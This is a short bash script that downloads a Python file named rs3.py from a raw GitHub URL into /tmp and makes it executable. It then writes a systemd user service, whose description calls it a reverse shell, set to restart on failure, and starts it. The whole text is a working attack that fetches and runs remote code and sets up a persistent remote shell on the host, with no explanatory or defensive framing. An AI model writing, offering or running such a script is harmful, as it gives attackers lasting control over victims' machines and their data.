#!/usr/bin/env bash

curl 'https://raw.githubusercontent.com/TarunChakitha/testtest/master/rs3.py' -o /tmp/rs3.py
chmod +x /tmp/rs3.py

touch ~/.config/systemd/user/rs.service
echo "
Description= Unit file for reverse shell.

Wants=network.target
After=syslog.target network-online.target

[Service]
Type=simple
ExecStart=/tmp/./rs3.py
Restart=on-failure
RestartSec=10
KillMode=process

[Install]
WantedBy=multi-user.target
" > ~/.config/systemd/user/rs.service

systemctl --user start rs.service
